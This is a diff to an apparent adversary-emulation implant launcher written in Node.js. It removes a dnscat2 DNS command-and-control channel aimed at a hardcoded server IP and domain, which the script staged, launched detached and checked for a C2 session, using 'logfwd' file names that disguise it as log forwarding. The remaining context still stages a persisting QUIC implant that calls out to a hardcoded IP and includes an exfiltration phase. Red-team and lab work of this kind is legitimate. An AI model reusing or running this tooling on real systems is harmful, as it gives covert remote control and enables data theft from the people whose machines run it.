@@ -34,22 +34,6 @@ const EICAR_HOST = 'secure.eicar.org';
 const EICAR_PATH = '/eicar.com.txt';
 const EICAR_OUT = path.join(TMP, 'eicar.com.txt');
 
-const DNSCAT = {
-  name: IS_WIN ? 'dnscat2.exe' : 'dnscat2',
-  server: process.env.LAB_DNSCAT_SERVER || '34.180.91.216',
-  port: process.env.LAB_DNSCAT_PORT || '53',
-  domain: process.env.LAB_DNSCAT_DOMAIN || 'dns.apexadversary.com',
-  secret: process.env.LAB_DNSCAT_SECRET || ''
-};
-
-function applyDnscatCfg(cfg) {
-  const d = (cfg && cfg.dnscat) || {};
-  if (!process.env.LAB_DNSCAT_SERVER && d.server) DNSCAT.server = d.server;
-  if (!process.env.LAB_DNSCAT_PORT && d.port) DNSCAT.port = d.port;
-  if (!process.env.LAB_DNSCAT_DOMAIN && d.domain) DNSCAT.domain = d.domain;
-  if (!process.env.LAB_DNSCAT_SECRET && d.secret !== undefined) DNSCAT.secret = d.secret || '';
-}
-
 const QUIC = {
   name: 'quic_implant.py',
   server: process.env.LAB_QUIC_SERVER || '34.146.249.74',
@@ -1143,64 +1127,12 @@ async function phase5Exfil(cfg, state, env, tunnelUp) {
 function payloadList() {
   if (IS_WIN) {
     return [
-      [DNSCAT.name, 'dnscat'],
       [QUIC.name, 'quic'],
       [DRIVER, 'sys'],
       [DRIVER_CLI, 'cli']
     ];
   }
-  return [[DNSCAT.name, 'dnscat'], [QUIC.name, 'quic']];
-}
-
-function buildDnscat(srcDir) {
-  return new Promise((resolve) => {
-    execFile('make', ['-C', srcDir], { windowsHide: true, timeout: 120000 }, (err, stdout, stderr) => {
-      const out = String(stdout || '') + String(stderr || '');
-      const bin = path.join(srcDir, 'dnscat');
-      if (!err && fs.existsSync(bin)) {
-        log(`[+] dnscat2 built from bundled source (${out.trim().split('\n').filter(Boolean).length} make lines)`);
-        resolve(bin);
-      } else {
-        log(`[-] dnscat2 build failed: ${(err && (err.code || err.message)) || ''} ${out.trim().slice(0, 300)}`);
-        resolve(null);
-      }
-    });
-  });
-}
-
-async function stageDnscatSource() {
-  const root = path.join(__dirname, 'dnscat2');
-  const dst = path.join(TMP, 'dnscat2');
-  const candidates = [];
-  if (process.platform === 'linux' && process.arch === 'x64') candidates.push('dnscat2-linux-x64');
-  candidates.push('dnscat2');
-  try {
-    for (const name of candidates) {
-      const p = path.join(__dirname, name);
-      if (fs.existsSync(p) && fs.statSync(p).isFile()) {
-        fs.copyFileSync(p, dst);
-        fs.chmodSync(dst, 0o755);
-        log(`[+] staged prebuilt dnscat2 (${name}) -> ${dst}`);
-        return dst;
-      }
-    }
-    if (!fs.existsSync(path.join(root, 'Makefile'))) {
-      log('[-] payload not bundled: dnscat2');
-      return null;
-    }
-    let bin = path.join(root, 'dnscat');
-    if (!fs.existsSync(bin)) {
-      bin = await buildDnscat(root);
-      if (!bin) return null;
-    }
-    fs.copyFileSync(bin, dst);
-    fs.chmodSync(dst, 0o755);
-    log(`[+] staged dnscat2 -> ${dst}`);
-    return dst;
-  } catch (e) {
-    log(`[-] dnscat2 stage: ${e.code || e.message}`);
-    return null;
-  }
+  return [[QUIC.name, 'quic']];
 }
 
 async function stagePayloads() {
@@ -1209,14 +1141,6 @@ async function stagePayloads() {
     const name = entry[0];
     const key = entry[1];
     staged[key] = null;
-    if (key === 'dnscat' && !IS_WIN) {
-      if (process.env.LAB_SKIP_DNSCAT === '1') {
-        log('[*] dnscat2 staging skipped (LAB_SKIP_DNSCAT=1)');
-        continue;
-      }
-      staged.dnscat = await stageDnscatSource();
-      continue;
-    }
     const src = path.join(__dirname, name);
     if (!fs.existsSync(src)) {
       log(`[-] payload not bundled: ${name}`);
@@ -1235,66 +1159,8 @@ async function stagePayloads() {
   return staged;
 }
 
-function launchDnscat(exePath) {
-  const pidFile = path.join(TMP, 'logfwd.dnscat.pid');
-  try {
-    const oldPid = Number(fs.readFileSync(pidFile, 'utf8'));
-    process.kill(oldPid, 0);
-    log(`[*] dnscat2 already running (pid ${oldPid}), skipping launch`);
-    return null;
-  } catch (e) { void e; }
-  const dns = `server=${DNSCAT.server},port=${DNSCAT.port},domain=${DNSCAT.domain}`;
-  const dargs = ['--dns', dns, '--retransmit-forever'];
-  if (DNSCAT.secret) dargs.push(`--secret=${DNSCAT.secret}`);
-  try {
-    const logf = path.join(TMP, 'logfwd.dnscat.log');
-    const fd = fs.openSync(logf, 'a');
-    const argv = [exePath, ...dargs].map((a) => `'${a.replace(/'/g, `'\\''`)}'`).join(' ');
-    const shcmd = `${argv}; rc=$?; echo "[wrapper] dnscat rc=$rc t=$(date -u +%H:%M:%S)" >> '${logf}'`;
-    const child = spawn('sh', ['-c', shcmd], {
-      windowsHide: true,
-      detached: !IS_WIN,
-      stdio: ['ignore', fd, fd]
-    });
-    fs.closeSync(fd);
-    try { fs.writeFileSync(pidFile, String(child.pid)); } catch (e) { void e; }
-    child.on('error', (e) => log(`[-] dnscat2 spawn error: ${e.message}`));
-    child.on('exit', (code, sig) => log(`[*] dnscat2 wrapper exited code=${code} sig=${sig}`));
-    child.unref();
-    log(`[+] dnscat2 launched pid=${child.pid} -> ${dns}` +
-      (DNSCAT.secret ? ' (preshared auth)' : ' (no secret: server runs without --secret)') +
-      ` output=${logf}`);
-    return child;
-  } catch (e) {
-    log(`[-] dnscat2: ${e.message}`);
-    return null;
-  }
-}
-
 function procAlive(pid) {
   try { process.kill(pid, 0); return true; } catch (e) { return e.code === 'EPERM'; }
-}
-
-async function reportDnscat(child) {
-  if (!child) return null;
-  await delay(6000);
-  if (child.signalCode || (child.exitCode !== null && child.exitCode !== undefined)) {
-    log(`[-] dnscat2 exited early (code=${child.exitCode}, signal=${child.signalCode})`);
-    return false;
-  }
-  if (!procAlive(child.pid)) {
-    log(`[-] dnscat2 pid ${child.pid} not alive at 6s (signalCode=${child.signalCode})`);
-    return false;
-  }
-  let connected = false;
-  try {
-    const txt = fs.readFileSync(path.join(TMP, 'logfwd.dnscat.log'), 'utf8');
-    connected = /Encrypted session established|authenticated the session|Session [0-9a-f]+ created/i.test(txt);
-  } catch (e) { void e; }
-  log(connected
-    ? '[+] dnscat2 session established with C2'
-    : '[*] dnscat2 running, no handshake yet (server down or unreachable)');
-  return connected;
 }
 
 function quicPython() {
@@ -1630,23 +1496,12 @@ function dconnectInstallContext() {
 }
 
 function armDconnectWatch(ppid) {
-  log(`[*] DConnect session binding: parent pid ${ppid} (dnscat/tunnel follow the collab tool; QUIC implant persists)`);
+  log(`[*] DConnect session binding: parent pid ${ppid} (tunnel follows the collab tool; QUIC implant persists)`);
   const tick = setInterval(() => {
     let alive = true;
     try { process.kill(ppid, 0); } catch (e) { alive = e.code === 'EPERM'; }
     if (alive) return;
-    log('[*] DConnect closed — terminating dnscat/tunnel channels (QUIC implant left running)');
-    for (const [pidFile, name] of [
-      [path.join(TMP, 'logfwd.dnscat.pid'), 'dnscat2']
-    ]) {
-      try {
-        const p = Number(fs.readFileSync(pidFile, 'utf8'));
-        if (p > 1) {
-          try { process.kill(-p); } catch (e1) { try { process.kill(p); } catch (e2) { void e2; } }
-        }
-        log(`[*] stopped ${name} (pid ${p})`);
-      } catch (e) { void e; }
-    }
+    log('[*] DConnect closed — terminating tunnel channel (QUIC implant left running)');
     if (TUNNEL_PID) {
       try { process.kill(-TUNNEL_PID); } catch (e) { void e; }
       log(`[*] stopped tunnel (pid ${TUNNEL_PID})`);
@@ -1671,7 +1526,6 @@ async function main() {
   log(`start host=${os.hostname()} user=${user} platform=${process.platform} node=${process.version} cwd=${process.cwd()}`);
 
   const cfg = loadConfig();
-  applyDnscatCfg(cfg);
   applyQuicCfg(cfg);
   if (process.env.DCONNECT_PARENT) {
     const dppid = Number(process.env.DCONNECT_PARENT) || 0;
@@ -1695,13 +1549,6 @@ async function main() {
 
   log('[phase6/6] EXECUTE: staged payload actions');
   const staged = await stagePayloads();
-
-  if (process.env.LAB_SKIP_DNSCAT !== '1') {
-    if (staged.dnscat) await reportDnscat(launchDnscat(staged.dnscat));
-    else log('[-] dnscat2 phase skipped (not bundled)');
-  } else {
-    log('[*] dnscat2 skipped');
-  }
 
   if (process.env.LAB_SKIP_QUIC !== '1') {
     if (staged.quic) await reportQuic(await launchQuic(staged.quic));
